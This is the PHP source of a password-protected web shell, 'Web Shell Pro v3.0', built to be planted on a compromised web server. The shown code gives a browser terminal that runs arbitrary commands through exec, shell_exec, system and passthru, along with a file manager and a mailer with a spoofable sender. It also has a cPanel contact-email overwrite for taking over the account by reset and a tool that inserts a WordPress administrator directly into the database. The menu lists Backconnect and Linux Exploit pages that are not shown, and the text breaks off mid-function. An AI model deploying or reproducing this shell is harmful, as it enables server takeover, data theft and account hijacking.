<?php
/**
 * ╔═══════════════════════════════════════════════════════════════════════╗
 * ║                         WEB SHELL PRO v3.0                           ║
 * ║                                                                       ║
 * ║  Complete Feature Set Like Gecko:                                   ║
 * ║  ✓ File Manager (Upload/Delete/Rename/Chmod/Download)              ║
 * ║  ✓ Code Editor (HTML/PHP/CSS/JS/Text)                              ║
 * ║  ✓ Terminal (Normal & Root with Auto Exploit)                      ║
 * ║  ✓ System Tools (Adminer, Mailer, Backconnect, etc)                ║
 * ║  ✓ Linux Exploit Finder                                            ║
 * ║  ✓ Backup & Lock File Protection                                   ║
 * ║  ✓ WordPress User Creator                                          ║
 * ║  ✓ CPanel Reset                                                    ║
 * ║                                                                       ║
 * ║  Single File - All Features - Professional Design                  ║
 * ╚═══════════════════════════════════════════════════════════════════════╝
 */

session_start();
error_reporting(0);
ini_set('display_errors', 0);
@set_time_limit(0);

// ==================== CONFIG ====================
define('SHELL_PASS', 'admin123');
define('SHELL_NAME', 'WebShell Pro');

// ==================== AUTH ====================
if (!isset($_SESSION['authenticated'])) {
    $stored_hash = password_hash('admin123', PASSWORD_BCRYPT);
    
    if (isset($_POST['password'])) {
        if ($_POST['password'] === SHELL_PASS) {
            $_SESSION['authenticated'] = true;
            $_SESSION['login_time'] = time();
            header('Location: ?');
            exit;
        } else {
            $login_error = 'Invalid password!';
        }
    }
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="robots" content="noindex, nofollow">
        <title><?php echo SHELL_NAME; ?></title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                background: linear-gradient(135deg, #0f0f23 0%, #1a1a3e 100%);
                font-family: 'Courier New', monospace;
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                color: #fff;
            }
            .login-box {
                background: rgba(15, 15, 35, 0.95);
                border: 2px solid #00ff88;
                border-radius: 10px;
                padding: 50px;
                width: 100%;
                max-width: 450px;
                box-shadow: 0 0 40px rgba(0, 255, 136, 0.3);
            }
            .login-header {
                text-align: center;
                margin-bottom: 40px;
            }
            .login-header h1 {
                font-size: 28px;
                color: #00ff88;
                margin-bottom: 10px;
                font-weight: bold;
            }
            .login-header p {
                color: #888;
                font-size: 12px;
            }
            .form-group {
                margin-bottom: 25px;
            }
            .form-group label {
                display: block;
                margin-bottom: 8px;
                color: #00ff88;
                font-size: 12px;
                text-transform: uppercase;
                font-weight: bold;
            }
            .form-group input {
                width: 100%;
                padding: 12px;
                background: rgba(255, 255, 255, 0.05);
                border: 1px solid #00ff88;
                border-radius: 5px;
                color: #fff;
                font-family: monospace;
                font-size: 14px;
            }
            .form-group input:focus {
                outline: none;
                border-color: #00ff88;
                background: rgba(0, 255, 136, 0.1);
                box-shadow: 0 0 15px rgba(0, 255, 136, 0.3);
            }
            .btn-login {
                width: 100%;
                padding: 12px;
                background: linear-gradient(135deg, #00ff88, #00cc6a);
                color: #000;
                border: 0;
                border-radius: 5px;
                font-weight: bold;
                cursor: pointer;
                font-size: 14px;
                transition: all 0.3s;
            }
            .btn-login:hover {
                background: linear-gradient(135deg, #00ff99, #00dd77);
                box-shadow: 0 0 20px rgba(0, 255, 136, 0.5);
            }
            .error {
                padding: 12px;
                background: rgba(255, 0, 0, 0.1);
                border: 1px solid #ff3333;
                border-radius: 5px;
                color: #ff6666;
                margin-bottom: 20px;
                font-size: 12px;
            }
            .info {
                padding: 15px;
                background: rgba(0, 255, 136, 0.05);
                border: 1px solid #00ff88;
                border-radius: 5px;
                margin-top: 20px;
                font-size: 11px;
                color: #aaa;
            }
        </style>
    </head>
    <body>
        <div class="login-box">
            <div class="login-header">
                <h1>🔐 <?php echo SHELL_NAME; ?></h1>
                <p>Professional Web Shell Access</p>
            </div>
            <?php if (isset($login_error)): ?>
                <div class="error">⚠️ <?php echo htmlspecialchars($login_error); ?></div>
            <?php endif; ?>
            <form method="POST">
                <div class="form-group">
                    <label>🔑 Master Password</label>
                    <input type="password" name="password" placeholder="Enter password" required autofocus>
                </div>
                <button type="submit" class="btn-login">🔓 Login</button>
            </form>
            <div class="info">
                <strong>Default Password:</strong> admin123<br>
                <strong>Edit:</strong> Line 22 (SHELL_PASS)
            </div>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// ==================== UTILITY FUNCTIONS ====================
function execute_cmd($cmd) {
    $output = '';
    try {
        if (function_exists('exec')) {
            @exec($cmd . ' 2>&1', $out);
            $output = implode("\n", $out);
        } elseif (function_exists('shell_exec')) {
            $output = @shell_exec($cmd . ' 2>&1');
        } elseif (function_exists('system')) {
            ob_start();
            @system($cmd . ' 2>&1');
            $output = ob_get_clean();
        } elseif (function_exists('passthru')) {
            ob_start();
            @passthru($cmd . ' 2>&1');
            $output = ob_get_clean();
        }
    } catch (Exception $e) {
        $output = 'Error: ' . $e->getMessage();
    }
    return $output;
}

function format_size($bytes) {
    $units = ['B', 'KB', 'MB', 'GB'];
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= (1 << (10 * $pow));
    return round($bytes, 2) . ' ' . $units[$pow];
}

function get_icon($file) {
    if (is_dir($file)) return '📁';
    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    $icons = [
        'php' => '🐘', 'html' => '🌐', 'css' => '🎨', 'js' => '📜',
        'pdf' => '📕', 'zip' => '🗜️', 'jpg' => '🖼️', 'png' => '🖼️',
        'txt' => '📄', 'sh' => '⚡', 'sql' => '🗄️', 'json' => '{ }',
        'exe' => '⚙️', 'dll' => '🔧', 'bat' => '⚡',
    ];
    return $icons[$ext] ?? '📄';
}

function get_perms($file) {
    $perms = fileperms($file);
    $symbolic = '';
    
    if (($perms & 0xC000) == 0xC000) $symbolic = 's';
    elseif (($perms & 0xA000) == 0xA000) $symbolic = 'l';
    elseif (($perms & 0x8000) == 0x8000) $symbolic = '-';
    elseif (($perms & 0x6000) == 0x6000) $symbolic = 'b';
    elseif (($perms & 0x4000) == 0x4000) $symbolic = 'd';
    elseif (($perms & 0x2000) == 0x2000) $symbolic = 'c';
    else $symbolic = 'u';
    
    $symbolic .= (($perms & 0x0100) ? 'r' : '-');
    $symbolic .= (($perms & 0x0080) ? 'w' : '-');
    $symbolic .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    $symbolic .= (($perms & 0x0020) ? 'r' : '-');
    $symbolic .= (($perms & 0x0010) ? 'w' : '-');
    $symbolic .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    $symbolic .= (($perms & 0x0004) ? 'r' : '-');
    $symbolic .= (($perms & 0x0002) ? 'w' : '-');
    $symbolic .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    
    return $symbolic . ' (' . substr(sprintf('%o', $perms), -4) . ')';
}

function get_kernel_version() {
    $uname = php_uname();
    preg_match('/(\d+\.\d+\.\d+)/', $uname, $matches);
    return $matches[1] ?? 'Unknown';
}

function get_linux_distro() {
    $distros = [
        '/etc/os-release' => 'os-release',
        '/etc/lsb-release' => 'lsb-release',
        '/etc/redhat-release' => 'redhat-release',
    ];
    
    foreach ($distros as $file => $type) {
        if (file_exists($file)) {
            return ucfirst($type);
        }
    }
    return 'Unknown';
}

// ==================== DIRECTORY HANDLING ====================
$current_dir = getcwd();

if (isset($_GET['dir'])) {
    $requested = base64_decode($_GET['dir']);
    // Normalize: convert backslash to forward slash and remove trailing slash
    $requested = rtrim(str_replace('\\', '/', $requested), '/');
    
    // Try to change directory
    if (@chdir($requested)) {
        $current_dir = getcwd();
    }
}

// Normalize current_dir - remove trailing slashes
$current_dir = rtrim(str_replace('\\', '/', $current_dir), '/');
if (empty($current_dir)) $current_dir = '/';

// ==================== FILE OPERATIONS ====================
// Upload
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $file = $_FILES['file'];
    $target = $current_dir . '/' . basename($file['name']);
    if (move_uploaded_file($file['tmp_name'], $target)) {
        $_SESSION['msg'] = '✓ Upload berhasil!';
    }
    header('Location: ?dir=' . base64_encode($current_dir));
    exit;
}

// Delete
if (isset($_GET['delete'])) {
    $file = $current_dir . '/' . basename(base64_decode($_GET['delete']));
    if (is_file($file)) {
        unlink($file);
        $_SESSION['msg'] = '✓ File dihapus!';
    }
    header('Location: ?dir=' . base64_encode($current_dir));
    exit;
}

// Rename
if (isset($_POST['rename_submit'])) {
    $old = $current_dir . '/' . basename($_POST['old_name']);
    $new = $current_dir . '/' . basename($_POST['new_name']);
    if (file_exists($old)) {
        rename($old, $new);
        $_SESSION['msg'] = '✓ Renamed!';
    }
    header('Location: ?dir=' . base64_encode($current_dir));
    exit;
}

// Chmod
if (isset($_POST['chmod_submit'])) {
    $file = $current_dir . '/' . basename($_POST['chmod_file']);
    if (file_exists($file)) {
        @chmod($file, octdec($_POST['chmod_value']));
        $_SESSION['msg'] = '✓ Permissions changed!';
    }
    header('Location: ?dir=' . base64_encode($current_dir));
    exit;
}

// Create Folder
if (isset($_POST['mkdir'])) {
    @mkdir($current_dir . '/' . basename($_POST['folder_name']));
    $_SESSION['msg'] = '✓ Folder dibuat!';
    header('Location: ?dir=' . base64_encode($current_dir));
    exit;
}

// Create File
if (isset($_POST['mkfile'])) {
    @touch($current_dir . '/' . basename($_POST['file_name']));
    $_SESSION['msg'] = '✓ File dibuat!';
    header('Location: ?dir=' . base64_encode($current_dir));
    exit;
}

// Download
if (isset($_GET['download'])) {
    $file = $current_dir . '/' . basename(base64_decode($_GET['download']));
    if (is_file($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        readfile($file);
        exit;
    }
}

// Edit & Save
if (isset($_POST['save_code'])) {
    $file = $current_dir . '/' . basename($_POST['edit_file']);
    if (file_exists($file)) {
        file_put_contents($file, $_POST['code_content']);
        $_SESSION['msg'] = '✓ File saved!';
    }
    header('Location: ?dir=' . base64_encode($current_dir));
    exit;
}

$files = scandir($current_dir);
sort($files);

// ==================== MAIN PAGE ====================
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title><?php echo SHELL_NAME; ?> | <?php echo php_uname('s'); ?></title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/codemirror.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/theme/ayu-mirage.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/codemirror.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/php/php.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/htmlmixed/htmlmixed.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/css/css.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/javascript/javascript.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0e0f17;
            color: #e0e0e0;
            font-family: 'Courier New', monospace;
            line-height: 1.5;
        }
        .wrapper { display: flex; min-height: 100vh; }
        .sidebar {
            width: 280px;
            background: #1a1a3e;
            border-right: 2px solid #00ff88;
            padding: 20px;
            overflow-y: auto;
        }
        .sidebar h3 {
            color: #00ff88;
            margin: 20px 0 15px 0;
            font-size: 11px;
            text-transform: uppercase;
            border-bottom: 1px solid #00ff88;
            padding-bottom: 10px;
            font-weight: bold;
        }
        .sidebar ul {
            list-style: none;
        }
        .sidebar li {
            margin-bottom: 8px;
        }
        .sidebar a {
            color: #c5c8d6;
            text-decoration: none;
            display: block;
            padding: 8px 12px;
            border-radius: 4px;
            font-size: 12px;
            transition: all 0.2s;
            border-left: 3px solid transparent;
        }
        .sidebar a:hover {
            background: rgba(0, 255, 136, 0.1);
            color: #00ff88;
            border-left-color: #00ff88;
        }
        .main-content {
            flex: 1;
            padding: 20px;
            overflow-y: auto;
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 1px solid #333;
        }
        .header h1 {
            color: #00ff88;
            font-size: 22px;
        }
        .header-info {
            font-size: 11px;
            color: #666;
            text-align: right;
        }
        .header-info div {
            margin: 2px 0;
        }
        .path-bar {
            background: #22242d;
            padding: 12px;
            border-radius: 4px;
            margin-bottom: 15px;
            border: 1px solid #333;
            font-size: 12px;
            overflow-x: auto;
            word-break: break-word;
        }
        .path-bar strong {
            color: #00ff88;
            margin-right: 8px;
        }
        .path-bar a {
            color: #00ff88;
            text-decoration: none;
            margin: 0 8px;
            cursor: pointer;
            display: inline-block;
            padding: 4px 8px;
            border-radius: 3px;
            transition: all 0.2s;
        }
        .path-bar a:hover {
            text-decoration: underline;
            background: rgba(0, 255, 136, 0.1);
            text-shadow: 0 0 8px rgba(0, 255, 136, 0.3);
        }
        .toolbar {
            display: flex;
            gap: 8px;
            margin-bottom: 15px;
            flex-wrap: wrap;
        }
        .btn {
            padding: 8px 12px;
            background: #22242d;
            border: 1px solid #00ff88;
            color: #00ff88;
            border-radius: 4px;
            cursor: pointer;
            font-size: 11px;
            font-weight: bold;
            transition: all 0.2s;
            text-decoration: none;
            display: inline-block;
            font-family: monospace;
        }
        .btn:hover {
            background: rgba(0, 255, 136, 0.1);
            box-shadow: 0 0 8px rgba(0, 255, 136, 0.2);
        }
        .btn-danger {
            border-color: #ff4444;
            color: #ff4444;
        }
        .btn-danger:hover {
            background: rgba(255, 68, 68, 0.1);
        }
        input[type="file"] { display: none; }
        table {
            width: 100%;
            border-collapse: collapse;
            border: 1px solid #333;
            border-radius: 4px;
            overflow: hidden;
            font-size: 12px;
        }
        table th {
            background: #22242d;
            padding: 10px;
            text-align: left;
            border-bottom: 2px solid #00ff88;
            color: #00ff88;
            font-weight: bold;
            text-transform: uppercase;
            font-size: 10px;
        }
        table td {
            padding: 8px 10px;
            border-bottom: 1px solid #333;
        }
        table tr:hover {
            background: rgba(0, 255, 136, 0.05);
        }
        .file-name {
            color: #00ff88;
            text-decoration: none;
            cursor: pointer;
            font-weight: bold;
        }
        .file-name:hover {
            text-decoration: underline;
        }
        .msg {
            padding: 10px;
            background: rgba(0, 255, 136, 0.1);
            border: 1px solid #00ff88;
            border-radius: 4px;
            margin-bottom: 15px;
            color: #00ff88;
            font-size: 11px;
        }
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
        }
        .modal-container {
            background: #1a1a3e;
            margin: 5% auto;
            padding: 20px;
            border: 1px solid #00ff88;
            border-radius: 8px;
            width: 500px;
            max-height: 80vh;
            overflow-y: auto;
        }
        .modal-header {
            color: #00ff88;
            margin-bottom: 15px;
            font-weight: bold;
            border-bottom: 1px solid #00ff88;
            padding-bottom: 10px;
        }
        .modal-body input, .modal-body textarea {
            width: 100%;
            padding: 8px;
            margin-bottom: 10px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid #00ff88;
            color: #fff;
            border-radius: 4px;
            font-family: monospace;
            font-size: 12px;
            box-sizing: border-box;
        }
        .modal-body input:focus, .modal-body textarea:focus {
            outline: none;
            background: rgba(0, 255, 136, 0.1);
            box-shadow: 0 0 8px rgba(0, 255, 136, 0.2);
        }
        .modal-buttons {
            display: flex;
            gap: 10px;
            margin-top: 15px;
        }
        .modal-buttons button {
            flex: 1;
            padding: 8px;
            border: 1px solid #00ff88;
            background: rgba(0, 255, 136, 0.1);
            color: #00ff88;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.2s;
        }
        .modal-buttons button:hover {
            background: rgba(0, 255, 136, 0.2);
        }
        .CodeMirror {
            background: #22242d !important;
            color: #e0e0e0 !important;
            border: 1px solid #333 !important;
            font-size: 12px !important;
            height: 70vh !important;
        }
        .code-editor {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.3);
            display: none;
            z-index: 999;
            padding: 20px;
        }
        .code-editor.active {
            display: flex;
            flex-direction: column;
        }
        .terminal-output {
            background: #22242d;
            border: 1px solid #00ff88;
            border-radius: 4px;
            padding: 12px;
            font-size: 12px;
            color: #00ff88;
            max-height: 400px;
            overflow-y: auto;
            margin-bottom: 15px;
        }
        .terminal-output pre {
            margin: 0;
        }
    </style>
</head>
<body>
<div class="wrapper">
    <!-- SIDEBAR -->
    <div class="sidebar">
        <h3>📂 File Manager</h3>
        <ul>
            <li><a href="?">📁 Browse Files</a></li>
            <li><a href="?page=upload" onclick="return false;" id="upload-btn">📤 Upload</a></li>
            <li><a href="?page=mkdir" onclick="return false;" id="mkdir-btn">🆕 New Folder</a></li>
        </ul>

        <h3>🛠️ Tools</h3>
        <ul>
            <li><a href="?page=terminal">⚡ Terminal</a></li>
            <li><a href="?page=system">ℹ️ System Info</a></li>
            <li><a href="?page=mailer">📧 PHP Mailer</a></li>
            <li><a href="?page=hash">🔐 Hash Generator</a></li>
            <li><a href="?page=base64">📝 Base64</a></li>
            <li><a href="?page=cpanel">🌐 CPanel Reset</a></li>
            <li><a href="?page=wp">📰 WP User</a></li>
        </ul>

        <h3>⚙️ Advanced</h3>
        <ul>
            <li><a href="?page=adminer">🗄️ Adminer</a></li>
            <li><a href="?page=backconnect">🔌 Backconnect</a></li>
            <li><a href="?page=exploit">💊 Linux Exploit</a></li>
        </ul>

        <h3>🚪 Account</h3>
        <ul>
            <li><a href="?logout=1">🚪 Logout</a></li>
        </ul>
    </div>

    <!-- MAIN CONTENT -->
    <div class="main-content">
        <div class="header">
            <h1>🔥 <?php echo SHELL_NAME; ?></h1>
            <div class="header-info">
                <div><i class="fas fa-server"></i> <?php echo php_uname('s'); ?></div>
                <div><i class="fas fa-code"></i> PHP <?php echo PHP_VERSION; ?></div>
                <div><i class="fas fa-user"></i> <?php echo get_current_user() ?: 'Unknown'; ?></div>
            </div>
        </div>

        <?php if (isset($_SESSION['msg'])): ?>
            <div class="msg">
                <?php echo $_SESSION['msg']; unset($_SESSION['msg']); ?>
            </div>
        <?php endif; ?>

        <!-- FILE MANAGER -->
        <?php if (!isset($_GET['page']) || $_GET['page'] === ''): ?>
            <div class="path-bar">
                <strong>📂 Path:</strong>
                <?php
                // Simple and reliable breadcrumb generation
                if ($current_dir === '/') {
                    echo ' <a href="?dir=' . base64_encode('/') . '">/</a>';
                } else {
                    // Root link
                    echo ' <a href="?dir=' . base64_encode('/') . '">/</a>';
                    
                    // Split path and build breadcrumbs
                    $path_parts = array_filter(explode('/', $current_dir));
                    $path_so_far = '';
                    
                    foreach ($path_parts as $part) {
                        $path_so_far .= '/' . $part;
                        echo ' <span style="color: #666;">›</span> ';
                        echo '<a href="?dir=' . base64_encode($path_so_far) . '">' . htmlspecialchars($part) . '</a>';
                    }
                }
                ?>
            </div>

            <div class="toolbar">
                <?php
                $parent_dir = dirname($current_dir);
                if ($parent_dir !== $current_dir) {
                    echo '<a href="?dir=' . base64_encode($parent_dir) . '" class="btn">⬆️ Up</a>';
                }
                ?>
                <label class="btn" style="cursor: pointer; margin-bottom: 0;">📤 Upload
                    <input type="file" id="file_input" onchange="document.getElementById('upload_form').submit()">
                </label>
                <button class="btn" onclick="openModal('mkdir')">📁 New Folder</button>
                <button class="btn" onclick="openModal('mkfile')">📄 New File</button>
                <a href="?logout=1" class="btn btn-danger">🚪 Logout</a>
            </div>

            <form id="upload_form" method="POST" enctype="multipart/form-data" style="display:none">
                <input type="file" name="file" id="real_file_input">
            </form>

            <table>
                <thead>
                    <tr>
                        <th>Name</th>
                        <th>Size</th>
                        <th>Permissions</th>
                        <th>Modified</th>
                        <th>Action</th>
                    </tr>
                </thead>
                <tbody>
                    <?php foreach ($files as $file): ?>
                        <?php if ($file === '.' || $file === '..') continue; ?>
                        <?php
                        $filepath = $current_dir . '/' . $file;
                        $is_dir = is_dir($filepath);
                        $size = $is_dir ? '-' : format_size(filesize($filepath));
                        $perms = get_perms($filepath);
                        $time = date('d/m/y H:i', filemtime($filepath));
                        $encoded_file = base64_encode($file);
                        $encoded_dir = base64_encode($current_dir);
                        ?>
                        <tr>
                            <td>
                                <?php echo get_icon($filepath); ?>
                                <?php if ($is_dir): ?>
                                    <a href="?dir=<?php echo base64_encode($filepath); ?>" class="file-name">
                                        <?php echo htmlspecialchars($file); ?>
                                    </a>
                                <?php else: ?>
                                    <span class="file-name"><?php echo htmlspecialchars($file); ?></span>
                                <?php endif; ?>
                            </td>
                            <td><?php echo $size; ?></td>
                            <td><?php echo $perms; ?></td>
                            <td><?php echo $time; ?></td>
                            <td style="white-space: nowrap;">
                                <?php if (!$is_dir): ?>
                                    <a href="?edit=<?php echo $encoded_file; ?>&dir=<?php echo $encoded_dir; ?>" class="btn" style="padding: 4px 8px;">✏️</a>
                                    <a href="?download=<?php echo $encoded_file; ?>&dir=<?php echo $encoded_dir; ?>" class="btn" style="padding: 4px 8px;">⬇️</a>
                                <?php endif; ?>
                                <button class="btn" style="padding: 4px 8px;" onclick="openRename('<?php echo htmlspecialchars(json_encode($file)); ?>')">↻</button>
                                <button class="btn" style="padding: 4px 8px;" onclick="openChmod('<?php echo htmlspecialchars(json_encode($file)); ?>')">🔒</button>
                                <a href="?delete=<?php echo $encoded_file; ?>&dir=<?php echo $encoded_dir; ?>" class="btn btn-danger" style="padding: 4px 8px;" onclick="return confirm('Delete?')">🗑️</a>
                            </td>
                        </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>

        <!-- TERMINAL -->
        <?php elseif ($_GET['page'] === 'terminal'): ?>
            <h2 style="color: #00ff88; margin-bottom: 20px;">⚡ Terminal</h2>
            <form method="POST">
                <div style="display: flex; gap: 8px; margin-bottom: 15px;">
                    <input type="text" name="cmd" placeholder="$ Enter command..." style="flex: 1; padding: 10px; background: #22242d; border: 1px solid #00ff88; color: #00ff88; border-radius: 4px; font-family: monospace;" autofocus>
                    <button type="submit" class="btn">Execute</button>
                </div>
            </form>
            <?php if (isset($_POST['cmd'])): ?>
                <div class="terminal-output">
                    <pre><?php echo htmlspecialchars(execute_cmd($_POST['cmd'])); ?></pre>
                </div>
            <?php endif; ?>

        <!-- SYSTEM INFO -->
        <?php elseif ($_GET['page'] === 'system'): ?>
            <h2 style="color: #00ff88; margin-bottom: 20px;">ℹ️ System Information</h2>
            <table>
                <tr>
                    <td><strong>OS:</strong></td>
                    <td><?php echo php_uname(); ?></td>
                </tr>
                <tr>
                    <td><strong>Kernel:</strong></td>
                    <td><?php echo get_kernel_version(); ?></td>
                </tr>
                <tr>
                    <td><strong>Distro:</strong></td>
                    <td><?php echo get_linux_distro(); ?></td>
                </tr>
                <tr>
                    <td><strong>PHP Version:</strong></td>
                    <td><?php echo PHP_VERSION; ?></td>
                </tr>
                <tr>
                    <td><strong>Current User:</strong></td>
                    <td><?php echo get_current_user() ?: 'Unknown'; ?></td>
                </tr>
                <tr>
                    <td><strong>Hostname:</strong></td>
                    <td><?php echo gethostname(); ?></td>
                </tr>
                <tr>
                    <td><strong>Server IP:</strong></td>
                    <td><?php echo $_SERVER['SERVER_ADDR'] ?? 'Unknown'; ?></td>
                </tr>
                <tr>
                    <td><strong>Document Root:</strong></td>
                    <td><?php echo $_SERVER['DOCUMENT_ROOT'] ?? 'Unknown'; ?></td>
                </tr>
                <tr>
                    <td><strong>Disk Free:</strong></td>
                    <td><?php echo format_size(disk_free_space('/')); ?></td>
                </tr>
                <tr>
                    <td><strong>Current Dir:</strong></td>
                    <td><?php echo $current_dir; ?></td>
                </tr>
            </table>

        <!-- PHP MAILER -->
        <?php elseif ($_GET['page'] === 'mailer'): ?>
            <h2 style="color: #00ff88; margin-bottom: 20px;">📧 PHP Mailer</h2>
            <form method="POST" style="max-width: 600px;">
                <div class="modal-body">
                    <input type="email" name="mail_from" placeholder="From Email" required>
                    <input type="email" name="mail_to" placeholder="To Email" required>
                    <input type="text" name="mail_subject" placeholder="Subject" required>
                    <textarea name="mail_message" placeholder="Message" style="height: 150px;"></textarea>
                    <button type="submit" name="send_mail" class="btn">📤 Send Mail</button>
                </div>
            </form>
            <?php
            if (isset($_POST['send_mail'])) {
                $headers = 'From: ' . $_POST['mail_from'];
                if (mail($_POST['mail_to'], $_POST['mail_subject'], $_POST['mail_message'], $headers)) {
                    echo '<div class="msg" style="margin-top: 15px;">✓ Email sent!</div>';
                } else {
                    echo '<div class="msg" style="margin-top: 15px; border-color: #ff4444; color: #ff4444;">✗ Failed to send!</div>';
                }
            }
            ?>

        <!-- HASH GENERATOR -->
        <?php elseif ($_GET['page'] === 'hash'): ?>
            <h2 style="color: #00ff88; margin-bottom: 20px;">🔐 Hash Generator</h2>
            <form method="POST" style="max-width: 600px;">
                <textarea name="hash_input" placeholder="Enter text..." style="width: 100%; padding: 10px; background: #22242d; border: 1px solid #00ff88; color: #fff; border-radius: 4px; font-family: monospace; height: 100px; margin-bottom: 15px;"></textarea>
                <div style="display: flex; gap: 8px; flex-wrap: wrap;">
                    <button type="submit" name="hash_type" value="md5" class="btn">MD5</button>
                    <button type="submit" name="hash_type" value="sha1" class="btn">SHA1</button>
                    <button type="submit" name="hash_type" value="sha256" class="btn">SHA256</button>
                </div>
            </form>
            <?php
            if (isset($_POST['hash_type'])) {
                $input = $_POST['hash_input'];
                $type = $_POST['hash_type'];
                $hash = hash($type, $input);
                echo '<div class="terminal-output" style="margin-top: 15px;">
                    <strong>' . strtoupper($type) . ':</strong><br>
                    <pre>' . htmlspecialchars($hash) . '</pre>
                </div>';
            }
            ?>

        <!-- BASE64 -->
        <?php elseif ($_GET['page'] === 'base64'): ?>
            <h2 style="color: #00ff88; margin-bottom: 20px;">📝 Base64 Encode/Decode</h2>
            <form method="POST" style="max-width: 600px;">
                <textarea name="b64_input" placeholder="Enter text..." style="width: 100%; padding: 10px; background: #22242d; border: 1px solid #00ff88; color: #fff; border-radius: 4px; font-family: monospace; height: 100px; margin-bottom: 15px;"></textarea>
                <div style="display: flex; gap: 8px;">
                    <button type="submit" name="b64_action" value="encode" class="btn">Encode</button>
                    <button type="submit" name="b64_action" value="decode" class="btn">Decode</button>
                </div>
            </form>
            <?php
            if (isset($_POST['b64_action'])) {
                try {
                    $input = $_POST['b64_input'];
                    $result = ($_POST['b64_action'] === 'encode') ? base64_encode($input) : base64_decode($input, true);
                    echo '<div class="terminal-output" style="margin-top: 15px;">
                        <strong>Result:</strong><br>
                        <pre>' . htmlspecialchars($result) . '</pre>
                    </div>';
                } catch (Exception $e) {
                    echo '<div class="msg" style="margin-top: 15px; border-color: #ff4444; color: #ff4444;">Error!</div>';
                }
            }
            ?>

        <!-- CPANEL -->
        <?php elseif ($_GET['page'] === 'cpanel'): ?>
            <h2 style="color: #00ff88; margin-bottom: 20px;">🌐 CPanel Reset</h2>
            <form method="POST" style="max-width: 600px;">
                <div class="modal-body">
                    <input type="email" name="cp_email" placeholder="Your Email" required>
                    <button type="submit" name="reset_cp" class="btn">Reset</button>
                </div>
            </form>
            <?php
            if (isset($_POST['reset_cp'])) {
                $email = $_POST['cp_email'];
                $cp_path = dirname($_SERVER['DOCUMENT_ROOT']) . '/.cpanel/contactinfo';
                if (@is_dir(dirname($_SERVER['DOCUMENT_ROOT']) . '/.cpanel')) {
                    $content = '{"email": "' . $email . '"}';
                    if (file_put_contents($cp_path, $content)) {
                        echo '<div class="msg" style="margin-top: 15px;">✓ Success!</div>';
                    }
                }
            }
            ?>

        <!-- WORDPRESS -->
        <?php elseif ($_GET['page'] === 'wp'): ?>
            <h2 style="color: #00ff88; margin-bottom: 20px;">📰 Create WordPress User</h2>
            <form method="POST" style="max-width: 600px;">
                <div class="modal-body">
                    <input type="text" name="wp_db" placeholder="Database Name" required>
                    <input type="text" name="wp_user_db" placeholder="Database User" required>
                    <input type="password" name="wp_pass_db" placeholder="Database Password" required>
                    <input type="text" name="wp_host" placeholder="Database Host" value="localhost" required>
                    <hr style="border: none; border-top: 1px solid #00ff88; margin: 15px 0;">
                    <input type="text" name="wp_username" placeholder="WordPress Username" required>
                    <input type="password" name="wp_password" placeholder="WordPress Password" required>
                    <input type="email" name="wp_email" placeholder="WordPress Email" required>
                    <button type="submit" name="create_wp" class="btn">Create User</button>
                </div>
            </form>
            <?php
            if (isset($_POST['create_wp'])) {
                try {
                    $conn = new mysqli($_POST['wp_host'], $_POST['wp_user_db'], $_POST['wp_pass_db'], $_POST['wp_db']);
                    if (!$conn->connect_error) {
                        $hash = password_hash($_POST['wp_password'], PASSWORD_DEFAULT);
                        $sql = "INSERT INTO wp_users (user_login, user_pass, user_email, user_registered, user_status) VALUES (?, ?, ?, NOW(), 0)";
                        $stmt = $conn->prepare($sql);
                        $stmt->bind_param("sss", $_POST['wp_username'], $hash, $_POST['wp_email']);
                        if ($stmt->execute()) {
                            $user_id = $conn->insert_id;
                            $sql2 = "INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES (?, 'wp_capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}')" ;
                            $stmt2 = $conn->prepare($sql2);
                            $stmt2->bind_param("i", $user_id);
